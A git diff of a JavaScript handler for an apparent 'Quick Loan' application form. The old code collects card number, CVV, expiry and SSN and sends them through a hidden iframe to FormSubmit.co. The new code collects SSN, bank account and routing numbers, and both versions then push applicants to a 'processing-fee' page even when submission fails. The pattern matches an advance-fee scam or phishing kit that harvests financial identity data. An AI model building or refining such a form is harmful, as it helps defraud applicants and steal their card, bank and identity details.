@@ -1,45 +1,70 @@
 /**
- * Quick Loan Application Form - JavaScript
- * Handles form navigation, validation, and submission
+ * apply.js — Multi-step form with validation
+ * Professional loan application form handler
+ * Fixed value parsing and data storage
  */
 
 // ============================================
-// State Management
+// GLOBAL VARIABLES
 // ============================================
-const FormState = {
-    currentStep: 1,
-    totalSteps: 4,
-    isSubmitted: false,
-
-    reset() {
-        this.currentStep = 1;
-        this.isSubmitted = false;
-    }
-};
+let currentStep = 1;
+const totalSteps = 4;
 
 // ============================================
-// Step Navigation
+// INITIALIZATION
+// ============================================
+document.addEventListener('DOMContentLoaded', function() {
+    initializeForm();
+    attachEventListeners();
+    initializeValidation();
+});
+
+function initializeForm() {
+    // Show first step
+    showStep(1);
+    updateProgressIndicator();
+}
+
+// ============================================
+// NAVIGATION FUNCTIONS
 // ============================================
 function nextStep() {
-    if (validateCurrentStep()) {
-        if (FormState.currentStep < FormState.totalSteps) {
-            hideStep(FormState.currentStep);
-            FormState.currentStep++;
-            showStep(FormState.currentStep);
-            updateProgressIndicator();
-            scrollToTop();
-        }
+    if (validateStep(currentStep)) {
+        // Mark current step as completed
+        markStepCompleted(currentStep);
+        
+        // Hide current step
+        hideStep(currentStep);
+        
+        // Move to next step
+        currentStep++;
+        
+        // Show next step
+        showStep(currentStep);
+        
+        // Update progress indicator
+        updateProgressIndicator();
+        
+        // Scroll to top smoothly
+        scrollToTop();
     }
 }
 
 function prevStep() {
-    if (FormState.currentStep > 1) {
-        hideStep(FormState.currentStep);
-        FormState.currentStep--;
-        showStep(FormState.currentStep);
-        updateProgressIndicator();
-        scrollToTop();
-    }
+    // Hide current step
+    hideStep(currentStep);
+    
+    // Move to previous step
+    currentStep--;
+    
+    // Show previous step
+    showStep(currentStep);
+    
+    // Update progress indicator
+    updateProgressIndicator();
+    
+    // Scroll to top smoothly
+    scrollToTop();
 }
 
 function showStep(stepNumber) {
@@ -64,475 +89,621 @@ function scrollToTop() {
 }
 
 // ============================================
-// Progress Indicator
+// PROGRESS INDICATOR
 // ============================================
 function updateProgressIndicator() {
-    const dots = document.querySelectorAll('.step-dot');
-    dots.forEach((dot, index) => {
-        if (index < FormState.currentStep) {
-            dot.classList.add('active');
-        } else {
-            dot.classList.remove('active');
-        }
-    });
-}
-
-// ============================================
-// Form Validation
-// ============================================
-const Validators = {
-    email: (value) => {
-        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        return emailRegex.test(value);
-    },
-
-    phone: (value) => {
-        const phoneRegex = /^[\d\s\-\+\(\)]{10,}$/;
-        return phoneRegex.test(value.replace(/\D/g, '')) && value.replace(/\D/g, '').length >= 10;
-    },
-
-    ssn: (value) => {
-        return /^\d{3}-\d{2}-\d{4}$/.test(value) || /^\d{9}$/.test(value);
-    },
-
-    notEmpty: (value) => {
-        return value.trim().length > 0;
-    },
-
-    cardNumber: (value) => {
-        const num = value.replace(/\s/g, '');
-        return /^\d{13,19}$/.test(num) && luhnCheck(num);
-    },
-
-    expiry: (value) => {
-        return /^(0[1-9]|1[0-2])\/\d{2}$/.test(value);
-    },
-
-    cvv: (value) => {
-        return /^\d{3,4}$/.test(value);
-    }
-};
-
-function luhnCheck(num) {
-    let sum = 0;
-    let isEven = false;
-    for (let i = num.length - 1; i >= 0; i--) {
-        let digit = parseInt(num[i], 10);
-        if (isEven) {
-            digit *= 2;
-            if (digit > 9) digit -= 9;
-        }
-        sum += digit;
-        isEven = !isEven;
-    }
-    return sum % 10 === 0;
-}
-
-function validateCurrentStep() {
-    clearAllErrors();
-    let isValid = true;
-
-    switch (FormState.currentStep) {
-        case 1:
-            isValid = validateStep1();
-            break;
-        case 2:
-            isValid = validateStep2();
-            break;
-        case 3:
-            isValid = validateStep3();
-            break;
-        case 4:
-            isValid = validateStep4();
-            break;
-    }
-
-    return isValid;
-}
-
-function validateStep1() {
-    let isValid = true;
-
-    const fullname = getFieldValue('fullname');
-    const email = getFieldValue('email');
-    const phone = getFieldValue('phone');
-
-    if (!Validators.notEmpty(fullname)) {
-        showError('fullname', 'Please enter your full name');
-        isValid = false;
-    }
-
-    if (!Validators.email(email)) {
-        showError('email', 'Please enter a valid email address');
-        isValid = false;
-    }
-
-    if (!Validators.phone(phone)) {
-        showError('phone', 'Please enter a valid phone number');
-        isValid = false;
-    }
-
-    return isValid;
-}
-
-function validateStep2() {
-    let isValid = true;
-
-    const loanType = getFieldValue('loanType');
-    const loanAmount = getFieldValue('loanAmount');
-    const income = getFieldValue('income');
-
-    if (!Validators.notEmpty(loanType)) {
-        showError('loanType', 'Please select a loan type');
-        isValid = false;
-    }
-
-    if (!loanAmount || loanAmount < 1000 || loanAmount > 500000) {
-        showError('loanAmount', 'Loan amount must be between $1,000 and $500,000');
-        isValid = false;
-    }
-
-    if (!income || income < 0) {
-        showError('income', 'Please enter a valid annual income');
-        isValid = false;
-    }
-
-    return isValid;
-}
-
-function validateStep3() {
-    let isValid = true;
-
-    const cardName = getFieldValue('cardName');
-    const cardNumber = getFieldValue('cardNumber');
-    const expiryDate = getFieldValue('expiryDate');
-    const cvv = getFieldValue('cvcField');
-
-    if (!Validators.notEmpty(cardName)) {
-        showError('cardName', 'Please enter cardholder name');
-        isValid = false;
-    }
-
-    if (!Validators.cardNumber(cardNumber.replace(/\s/g, ''))) {
-        showError('cardNumber', 'Please enter a valid card number');
-        isValid = false;
-    }
-
-    if (!Validators.expiry(expiryDate)) {
-        showError('expiryDate', 'Please enter expiry date in MM/YY format');
-        isValid = false;
-    }
-
-    if (!Validators.cvv(cvv)) {
-        showError('cvcField', 'Please enter a valid CVV');
-        isValid = false;
-    }
-
-    return isValid;
-}
-
-function validateStep4() {
-    let isValid = true;
-
-    const address = getFieldValue('address');
-    const ssn = getFieldValue('ssn');
-    const terms = document.getElementById('terms').checked;
-
-    if (!Validators.notEmpty(address)) {
-        showError('address', 'Please enter your full address');
-        isValid = false;
-    }
-
-    if (!Validators.ssn(ssn)) {
-        showError('ssn', 'Please enter a valid SSN (000-00-0000 or 000000000)');
-        isValid = false;
-    }
-
-    if (!terms) {
-        showError('terms', 'You must agree to the terms');
-        isValid = false;
-    }
-
-    return isValid;
-}
-
-// ============================================
-// Error Handling
-// ============================================
-function showError(fieldId, message) {
-    const errorElement = document.getElementById(`${fieldId}-error`);
-    const inputElement = document.getElementById(fieldId);
-
-    if (errorElement) {
-        errorElement.textContent = message;
-        errorElement.classList.add('show');
-        errorElement.style.display = 'block';
-    }
-
-    if (inputElement) {
-        inputElement.classList.add('error');
-    }
-}
-
-function clearAllErrors() {
-    const errorMessages = document.querySelectorAll('.error-message');
-    const errorInputs = document.querySelectorAll('.error');
-
-    errorMessages.forEach((error) => {
-        error.classList.remove('show');
-        error.style.display = 'none';
-    });
-
-    errorInputs.forEach((input) => {
-        input.classList.remove('error');
-    });
-}
-
-function getFieldValue(fieldId) {
-    const field = document.getElementById(fieldId);
-    return field ? field.value.trim() : '';
-}
-
-// ============================================
-// Form Submission
-// ============================================
-function initializeFormSubmission() {
-    const form = document.getElementById('applicationForm');
-
-    if (!form) return;
-
-    form.addEventListener('submit', handleFormSubmit);
-}
-
-function handleFormSubmit(e) {
-    e.preventDefault();
-
-    if (FormState.isSubmitted) {
-        return;
-    }
-
-    if (!validateAllSteps()) {
-        return;
-    }
-
-    FormState.isSubmitted = true;
-
-    showLoading(true);
-    disableSubmitButton(true);
-
-    const form = document.getElementById('applicationForm');
-    form.submit();
-
-    handlePostSubmission();
-}
-
-function validateAllSteps() {
-    const step1Valid = validateFieldsInStep(1);
-    const step2Valid = validateFieldsInStep(2);
-    const step3Valid = validateFieldsInStep(3);
-    const step4Valid = validateFieldsInStep(4);
-
-    return step1Valid && step2Valid && step3Valid && step4Valid;
-}
-
-function validateFieldsInStep(stepNumber) {
-    const currentStepBackup = FormState.currentStep;
-    FormState.currentStep = stepNumber;
-    const isValid = validateCurrentStep();
-    FormState.currentStep = currentStepBackup;
-    return isValid;
-}
-
-function handlePostSubmission() {
-    setTimeout(() => {
-        // Store application data in sessionStorage
-        sessionStorage.setItem('applicantName', getFieldValue('fullname'));
-        sessionStorage.setItem('applicantEmail', getFieldValue('email'));
-        sessionStorage.setItem('loanType', getFieldValue('loanType'));
-        sessionStorage.setItem('loanAmount', '$' + getFieldValue('loanAmount'));
+    const indicators = document.querySelectorAll('.step-indicator');
+    
+    indicators.forEach((indicator, index) => {
+        const stepNum = index + 1;
         
-        // Redirect to processing fee page
-        window.location.href = 'processing-fee.html';
-    }, 2000);
-}
-
-// ============================================
-// UI Controls
-// ============================================
-function showLoading(show) {
-    const loading = document.getElementById('loading');
-    if (loading) {
-        loading.classList.toggle('show', show);
-        loading.style.display = show ? 'block' : 'none';
-    }
-}
-
-function disableSubmitButton(disabled) {
-    const submitButton = document.getElementById('submitButton');
-    if (submitButton) {
-        submitButton.disabled = disabled;
-    }
-}
-
-function hideAllSteps() {
-    document.querySelectorAll('.step').forEach((step) => {
-        step.style.display = 'none';
+        // Remove all state classes
+        indicator.classList.remove('active', 'completed');
+        
+        // Add appropriate class
+        if (stepNum < currentStep) {
+            indicator.classList.add('completed');
+        } else if (stepNum === currentStep) {
+            indicator.classList.add('active');
+        }
     });
 }
 
-function showSuccessMessage() {
-    const successMessage = document.getElementById('successMessage');
-    if (successMessage) {
-        successMessage.classList.add('show');
-        successMessage.style.display = 'block';
+function markStepCompleted(stepNumber) {
+    const indicator = document.querySelector(`.step-indicator[data-step="${stepNumber}"]`);
+    if (indicator) {
+        indicator.classList.add('completed');
+        indicator.classList.remove('active');
     }
 }
 
 // ============================================
-// Credit Card Visualization
+// VALIDATION FUNCTIONS
 // ============================================
-function initializeCardVisualization() {
-    const cardName = document.getElementById('cardName');
-    const cardNumber = document.getElementById('cardNumber');
-    const expiryDate = document.getElementById('expiryDate');
-    const cvcField = document.getElementById('cvcField');
-    const cardWrapper = document.getElementById('cardWrapper');
-
-    if (cardName) {
-        cardName.addEventListener('input', (e) => {
-            document.getElementById('cardHolderDisplay').textContent = e.target.value.toUpperCase() || 'CARDHOLDER';
-        });
+function validateStep(stepNumber) {
+    let isValid = true;
+    const step = document.getElementById(`step${stepNumber}`);
+    
+    if (!step) return false;
+    
+    // Get all required inputs in the current step
+    const inputs = step.querySelectorAll('input[required], select[required]');
+    
+    inputs.forEach(input => {
+        if (!validateField(input)) {
+            isValid = false;
+        }
+    });
+    
+    // Show alert if validation fails
+    if (!isValid) {
+        showValidationAlert('Please fill in all required fields correctly.');
     }
+    
+    return isValid;
+}
 
-    if (cardNumber) {
-        cardNumber.addEventListener('input', (e) => {
-            let value = e.target.value.replace(/\s/g, '');
-            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
-            e.target.value = formattedValue;
-
-            // Detect card type
-            const firstDigit = value[0];
-            let cardType = 'VISA';
-            if (firstDigit === '4') cardType = 'VISA';
-            else if (firstDigit === '5') cardType = 'MASTERCARD';
-            else if (firstDigit === '3') cardType = 'AMEX';
-            else if (firstDigit === '6') cardType = 'DISCOVER';
-
-            document.getElementById('cardType').textContent = cardType;
-            document.getElementById('cardDisplay').textContent = formattedValue || '•••• •••• •••• ••••';
-        });
+function validateField(field) {
+    const fieldId = field.id;
+    const errorElement = document.getElementById(`${fieldId}-error`);
+    let isValid = true;
+    let errorMessage = '';
+    
+    // Clear previous error
+    field.classList.remove('error');
+    if (errorElement) {
+        errorElement.classList.remove('show');
     }
+    
+    // Check if field is empty (except checkbox)
+    if (field.type !== 'checkbox' && !field.value.trim()) {
+        isValid = false;
+        errorMessage = 'This field is required';
+    }
+    
+    // Specific validation rules
+    if (field.value.trim()) {
+        switch (fieldId) {
+            case 'fullname':
+                if (field.value.trim().split(' ').length < 2) {
+                    isValid = false;
+                    errorMessage = 'Please enter your full name (first and last name)';
+                }
+                break;
+                
+            case 'email':
+                const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (!emailPattern.test(field.value)) {
+                    isValid = false;
+                    errorMessage = 'Please enter a valid email address';
+                }
+                break;
+                
+            case 'phone':
+                const phonePattern = /^[\d\s\+\-\(\)]+$/;
+                const phoneDigits = field.value.replace(/\D/g, '');
+                if (!phonePattern.test(field.value) || phoneDigits.length < 10) {
+                    isValid = false;
+                    errorMessage = 'Please enter a valid phone number (at least 10 digits)';
+                }
+                break;
+                
+            case 'dob':
+                const dob = new Date(field.value);
+                const today = new Date();
+                const age = today.getFullYear() - dob.getFullYear();
+                if (age < 18) {
+                    isValid = false;
+                    errorMessage = 'You must be at least 18 years old to apply';
+                }
+                break;
+                
+            case 'loanAmount':
+                // Get clean value from data attribute
+                const cleanLoanAmount = field.getAttribute('data-clean-value') || field.value.replace(/,/g, '');
+                const amount = parseFloat(cleanLoanAmount);
+                if (isNaN(amount) || amount < 1000 || amount > 500000) {
+                    isValid = false;
+                    errorMessage = 'Loan amount must be between $1,000 and $500,000';
+                }
+                break;
+                
+            case 'income':
+                // Get clean value from data attribute
+                const cleanIncome = field.getAttribute('data-clean-value') || field.value.replace(/,/g, '');
+                const incomeValue = parseFloat(cleanIncome);
+                if (isNaN(incomeValue) || incomeValue < 0) {
+                    isValid = false;
+                    errorMessage = 'Please enter a valid income amount';
+                }
+                break;
+                
+            case 'accountNumber':
+                if (field.value.replace(/\D/g, '').length < 6) {
+                    isValid = false;
+                    errorMessage = 'Please enter a valid account number';
+                }
+                break;
+                
+            case 'routingNumber':
+                if (field.value.replace(/\D/g, '').length !== 9) {
+                    isValid = false;
+                    errorMessage = 'Routing number must be exactly 9 digits';
+                }
+                break;
+                
+            case 'zipcode':
+                if (field.value.replace(/\D/g, '').length !== 5) {
+                    isValid = false;
+                    errorMessage = 'Please enter a valid 5-digit ZIP code';
+                }
+                break;
+                
+            case 'ssn':
+                const ssnPattern = /^\d{3}-\d{2}-\d{4}$/;
+                if (!ssnPattern.test(field.value)) {
+                    isValid = false;
+                    errorMessage = 'Please enter a valid SSN (format: 000-00-0000)';
+                }
+                break;
+        }
+    }
+    
+    // Check checkbox
+    if (field.type === 'checkbox' && field.id === 'terms') {
+        if (!field.checked) {
+            isValid = false;
+            errorMessage = 'You must agree to the terms to continue';
+        }
+    }
+    
+    // Show error if invalid
+    if (!isValid) {
+        field.classList.add('error');
+        if (errorElement) {
+            errorElement.textContent = errorMessage;
+            errorElement.classList.add('show');
+        }
+    }
+    
+    return isValid;
+}
 
-    if (expiryDate) {
-        expiryDate.addEventListener('input', (e) => {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length >= 2) {
-                value = value.slice(0, 2) + '/' + value.slice(2, 4);
+function showValidationAlert(message) {
+    // Create alert if it doesn't exist
+    let alert = document.querySelector('.validation-alert');
+    
+    if (!alert) {
+        alert = document.createElement('div');
+        alert.className = 'validation-alert';
+        document.body.appendChild(alert);
+    }
+    
+    alert.textContent = message;
+    alert.classList.add('show');
+    
+    // Auto-hide after 3 seconds
+    setTimeout(() => {
+        alert.classList.remove('show');
+    }, 3000);
+}
+
+// ============================================
+// EVENT LISTENERS
+// ============================================
+function attachEventListeners() {
+    // Real-time validation on input
+    const allInputs = document.querySelectorAll('input, select');
+    
+    allInputs.forEach(input => {
+        // Validate on blur
+        input.addEventListener('blur', function() {
+            if (this.value.trim() || this.type === 'checkbox') {
+                validateField(this);
             }
-            e.target.value = value;
-            document.getElementById('cardExpDisplay').textContent = value || 'MM/YY';
         });
-    }
-
-    if (cvcField) {
-        cvcField.addEventListener('input', (e) => {
-            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
-            document.getElementById('cvcDisplay').value = e.target.value;
+        
+        // Clear error on input
+        input.addEventListener('input', function() {
+            this.classList.remove('error');
+            const errorElement = document.getElementById(`${this.id}-error`);
+            if (errorElement) {
+                errorElement.classList.remove('show');
+            }
         });
-
-        cvcField.addEventListener('focus', () => {
-            if (cardWrapper) cardWrapper.classList.add('flipped');
-        });
-
-        cvcField.addEventListener('blur', () => {
-            if (cardWrapper) cardWrapper.classList.remove('flipped');
-        });
-    }
+    });
 }
 
 // ============================================
-// Input Formatting
+// FIELD FORMATTING
 // ============================================
-function initializeInputFormatting() {
-    // Phone Auto-formatting
-    const phoneInput = document.getElementById('phone');
-    if (phoneInput) {
-        phoneInput.addEventListener('input', (e) => {
-            e.target.value = e.target.value.replace(/[^\d\s\-\+\(\)]/g, '');
-        });
-    }
-
-    // SSN Auto-formatting
+function initializeValidation() {
+    // Format SSN input
     const ssnInput = document.getElementById('ssn');
     if (ssnInput) {
-        ssnInput.addEventListener('input', (e) => {
+        ssnInput.addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '');
-            if (value.length > 5) {
-                value = value.slice(0, 3) + '-' + value.slice(3, 5) + '-' + value.slice(5, 9);
-            } else if (value.length > 3) {
+            if (value.length > 3 && value.length <= 5) {
                 value = value.slice(0, 3) + '-' + value.slice(3);
+            } else if (value.length > 5) {
+                value = value.slice(0, 3) + '-' + value.slice(3, 5) + '-' + value.slice(5, 9);
             }
             e.target.value = value;
         });
     }
-}
-
-// ============================================
-// Iframe Load Handler
-// ============================================
-function initializeIframeHandler() {
-    const iframe = document.getElementById('hiddenFrame');
-
-    if (iframe) {
-        iframe.addEventListener('load', () => {
-            console.log('[v0] Form successfully submitted to FormSubmit.co');
+    
+    // Format routing number (numbers only)
+    const routingInput = document.getElementById('routingNumber');
+    if (routingInput) {
+        routingInput.addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 9);
+        });
+    }
+    
+    // Format ZIP code (numbers only)
+    const zipcodeInput = document.getElementById('zipcode');
+    if (zipcodeInput) {
+        zipcodeInput.addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 5);
+        });
+    }
+    
+    // Format phone number
+    const phoneInput = document.getElementById('phone');
+    if (phoneInput) {
+        phoneInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 0) {
+                if (value.length <= 3) {
+                    value = value;
+                } else if (value.length <= 6) {
+                    value = '(' + value.slice(0, 3) + ') ' + value.slice(3);
+                } else {
+                    value = '(' + value.slice(0, 3) + ') ' + value.slice(3, 6) + '-' + value.slice(6, 10);
+                }
+            }
+            e.target.value = value;
+        });
+    }
+    
+    // Format loan amount with live comma formatting
+    const loanAmountInput = document.getElementById('loanAmount');
+    if (loanAmountInput) {
+        // Change input type from number to text to allow commas
+        loanAmountInput.setAttribute('type', 'text');
+        loanAmountInput.setAttribute('inputmode', 'numeric');
+        
+        loanAmountInput.addEventListener('input', function(e) {
+            // Get cursor position
+            let cursorPosition = e.target.selectionStart;
+            
+            // Get the value and remove all non-numeric characters
+            let value = e.target.value.replace(/[^\d]/g, '');
+            
+            // Store clean value
+            e.target.setAttribute('data-clean-value', value);
+            
+            // Format with commas
+            if (value) {
+                const formatted = parseInt(value, 10).toLocaleString('en-US');
+                const oldLength = e.target.value.length;
+                e.target.value = formatted;
+                const newLength = formatted.length;
+                
+                // Adjust cursor position if commas were added/removed
+                const diff = newLength - oldLength;
+                cursorPosition = Math.max(cursorPosition + diff, 0);
+                e.target.setSelectionRange(cursorPosition, cursorPosition);
+            } else {
+                e.target.value = '';
+            }
+        });
+        
+        // Validate on blur
+        loanAmountInput.addEventListener('blur', function(e) {
+            const cleanValue = e.target.getAttribute('data-clean-value') || '';
+            const numValue = parseInt(cleanValue, 10) || 0;
+            
+            if (numValue > 0) {
+                e.target.value = numValue.toLocaleString('en-US');
+            } else {
+                e.target.value = '';
+            }
+        });
+    }
+    
+    // Format income with live comma formatting
+    const incomeInput = document.getElementById('income');
+    if (incomeInput) {
+        // Change input type from number to text to allow commas
+        incomeInput.setAttribute('type', 'text');
+        incomeInput.setAttribute('inputmode', 'numeric');
+        
+        incomeInput.addEventListener('input', function(e) {
+            // Get cursor position
+            let cursorPosition = e.target.selectionStart;
+            
+            // Get the value and remove all non-numeric characters
+            let value = e.target.value.replace(/[^\d]/g, '');
+            
+            // Store clean value
+            e.target.setAttribute('data-clean-value', value);
+            
+            // Format with commas
+            if (value) {
+                const formatted = parseInt(value, 10).toLocaleString('en-US');
+                const oldLength = e.target.value.length;
+                e.target.value = formatted;
+                const newLength = formatted.length;
+                
+                // Adjust cursor position if commas were added/removed
+                const diff = newLength - oldLength;
+                cursorPosition = Math.max(cursorPosition + diff, 0);
+                e.target.setSelectionRange(cursorPosition, cursorPosition);
+            } else {
+                e.target.value = '';
+            }
+        });
+        
+        // Validate on blur
+        incomeInput.addEventListener('blur', function(e) {
+            const cleanValue = e.target.getAttribute('data-clean-value') || '';
+            const numValue = parseInt(cleanValue, 10) || 0;
+            
+            if (numValue > 0) {
+                e.target.value = numValue.toLocaleString('en-US');
+            } else {
+                e.target.value = '';
+            }
         });
     }
 }
 
 // ============================================
-// Real-time Validation
+// DATA STORAGE HELPER
 // ============================================
-function initializeRealTimeValidation() {
-    const inputs = document.querySelectorAll('input[required], select[required]');
-
-    inputs.forEach((input) => {
-        input.addEventListener('blur', () => {
-            if (input.value.trim()) {
-                input.classList.remove('error');
-                const errorElement = document.getElementById(`${input.id}-error`);
-                if (errorElement) {
-                    errorElement.style.display = 'none';
-                }
-            }
+function storeFormData() {
+    try {
+        // Get form values
+        const fullname = document.getElementById('fullname')?.value || '';
+        const email = document.getElementById('email')?.value || '';
+        const loanType = document.getElementById('loanType')?.value || '';
+        
+        // Get raw values and clean them
+        const loanAmountInput = document.getElementById('loanAmount');
+        const incomeInput = document.getElementById('income');
+        
+        let loanAmount = '';
+        let income = '';
+        
+        // Get loan amount - check data attribute first, then clean the value
+        if (loanAmountInput) {
+            const dataValue = loanAmountInput.getAttribute('data-clean-value');
+            loanAmount = dataValue || loanAmountInput.value || '';
+        }
+        
+        // Get income - check data attribute first, then clean the value
+        if (incomeInput) {
+            const dataValue = incomeInput.getAttribute('data-clean-value');
+            income = dataValue || incomeInput.value || '';
+        }
+        
+        // Parse numeric values (remove any commas that might still be there)
+        const parsedLoanAmount = parseFloat(String(loanAmount).replace(/,/g, '')) || 0;
+        const parsedIncome = parseFloat(String(income).replace(/,/g, '')) || 0;
+        
+        console.log('Storing form data:', {
+            name: fullname,
+            email: email,
+            loanType: loanType,
+            loanAmount: parsedLoanAmount,
+            annualIncome: parsedIncome
         });
+        
+        // Store in sessionStorage for processing-fee.html
+        sessionStorage.setItem('applicantName', fullname);
+        sessionStorage.setItem('applicantEmail', email);
+        sessionStorage.setItem('loanType', loanType);
+        sessionStorage.setItem('loanAmount', parsedLoanAmount.toString());
+        sessionStorage.setItem('annualIncome', parsedIncome.toString());
+        
+        // Also store in localStorage as backup
+        localStorage.setItem('applicantName', fullname);
+        localStorage.setItem('applicantEmail', email);
+        localStorage.setItem('loanType', loanType);
+        localStorage.setItem('loanAmount', parsedLoanAmount.toString());
+        localStorage.setItem('annualIncome', parsedIncome.toString());
+        
+    } catch (e) {
+        console.error('Error storing form data:', e);
+    }
+}
+
+// ============================================
+// FORM SUBMISSION
+// ============================================
+document.getElementById('applicationForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    // Final validation
+    if (!validateStep(currentStep)) {
+        return;
+    }
+    
+    // Get references to inputs that might have formatted values
+    const loanAmountInput = document.getElementById('loanAmount');
+    const incomeInput = document.getElementById('income');
+    
+    // Store original formatted values
+    const originalLoanAmount = loanAmountInput ? loanAmountInput.value : '';
+    const originalIncome = incomeInput ? incomeInput.value : '';
+    
+    // Temporarily set clean values for form submission
+    if (loanAmountInput && loanAmountInput.value) {
+        loanAmountInput.value = loanAmountInput.value.replace(/,/g, '');
+    }
+    
+    if (incomeInput && incomeInput.value) {
+        incomeInput.value = incomeInput.value.replace(/,/g, '');
+    }
+    
+    // Store form data before submission
+    storeFormData();
+    
+    // Disable submit button
+    const submitButton = document.getElementById('submitButton');
+    if (submitButton) {
+        submitButton.disabled = true;
+    }
+    
+    // Show loading overlay
+    const loading = document.getElementById('loading');
+    if (loading) {
+        loading.classList.add('show');
+    }
+    
+    // Create form data with cleaned values
+    const formData = new FormData(this);
+    
+    // Submit via fetch
+    fetch(this.action, {
+        method: 'POST',
+        body: formData
+    }).then(() => {
+        // Show success after delay
+        setTimeout(function() {
+            // Hide loading
+            if (loading) {
+                loading.classList.remove('show');
+            }
+            
+            // Hide form
+            document.getElementById('applicationForm').style.display = 'none';
+            
+            // Hide progress indicator
+            const progressWrapper = document.querySelector('.progress-wrapper');
+            if (progressWrapper) {
+                progressWrapper.style.display = 'none';
+            }
+            
+            // Show success message
+            const successMessage = document.getElementById('successMessage');
+            if (successMessage) {
+                successMessage.classList.add('show');
+            }
+            
+            // Scroll to top
+            scrollToTop();
+            
+            // Store submission timestamp
+            storeSubmissionData();
+            
+            // Redirect to processing fee page after 3 seconds
+            setTimeout(function() {
+                window.location.href = 'processing-fee.html';
+            }, 3000);
+            
+        }, 2000);
+    }).catch((error) => {
+        console.error('Submission error:', error);
+        // Still proceed to processing fee page even if email fails
+        setTimeout(function() {
+            if (loading) {
+                loading.classList.remove('show');
+            }
+            window.location.href = 'processing-fee.html';
+        }, 2000);
+    });
+});
+
+// ============================================
+// STORAGE FUNCTIONS
+// ============================================
+function storeSubmissionData() {
+    const submissionData = {
+        timestamp: new Date().toISOString(),
+        loanType: document.getElementById('loanType')?.value || '',
+        loanAmount: parseFloat(document.getElementById('loanAmount')?.value.replace(/,/g, '') || '0'),
+        submitted: true
+    };
+    
+    try {
+        localStorage.setItem('quickloan_last_application', JSON.stringify(submissionData));
+    } catch (e) {
+        console.log('Could not save to localStorage:', e);
+    }
+}
+
+// ============================================
+// KEYBOARD NAVIGATION
+// ============================================
+document.addEventListener('keydown', function(e) {
+    // Enter key on non-textarea fields should go to next step
+    if (e.key === 'Enter' && e.target.tagName !== 'TEXTAREA' && e.target.type !== 'submit') {
+        e.preventDefault();
+        
+        const nextButton = document.querySelector('.form-step.active .btn-next');
+        if (nextButton) {
+            nextButton.click();
+        }
+    }
+});
+
+// ============================================
+// UTILITY FUNCTIONS
+// ============================================
+function formatCurrency(value) {
+    return new Intl.NumberFormat('en-US', {
+        style: 'currency',
+        currency: 'USD',
+        minimumFractionDigits: 0,
+        maximumFractionDigits: 0
+    }).format(value);
+}
+
+function formatDate(dateString) {
+    const date = new Date(dateString);
+    return date.toLocaleDateString('en-US', {
+        year: 'numeric',
+        month: 'long',
+        day: 'numeric'
     });
 }
 
 // ============================================
-// Initialization
+// PREVENT ACCIDENTAL NAVIGATION
 // ============================================
-function initialize() {
-    console.log('[v0] Initializing Quick Loan Application Form...');
+let formModified = false;
 
-    // Initialize all modules
-    initializeFormSubmission();
-    initializeCardVisualization();
-    initializeInputFormatting();
-    initializeRealTimeValidation();
-    initializeIframeHandler();
+document.querySelectorAll('input, select, textarea').forEach(function(element) {
+    element.addEventListener('change', function() {
+        formModified = true;
+    });
+});
 
-    // Set initial state
-    updateProgressIndicator();
+window.addEventListener('beforeunload', function(e) {
+    if (formModified && currentStep < totalSteps) {
+        e.preventDefault();
+        e.returnValue = '';
+        return '';
+    }
+});
 
-    console.log('[v0] Quick Loan Application Form initialized successfully!');
+// ============================================
+// ANALYTICS & TRACKING (Optional)
+// ============================================
+function trackStepCompletion(stepNumber) {
+    // Add your analytics tracking here
+    console.log(`Step ${stepNumber} completed`);
+}
+
+function trackFormSubmission() {
+    // Add your analytics tracking here
+    console.log('Form submitted successfully');
 }
 
 // ============================================
-// Execute on DOM Ready
+// CONSOLE WELCOME MESSAGE
 // ============================================
-if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', initialize);
-} else {
-    initialize();
-}
+console.log('%cQuick Loan Application Form', 'color: #00d4ff; font-size: 20px; font-weight: bold;');
+console.log('%cForm initialized successfully', 'color: #51cf66; font-size: 14px;');
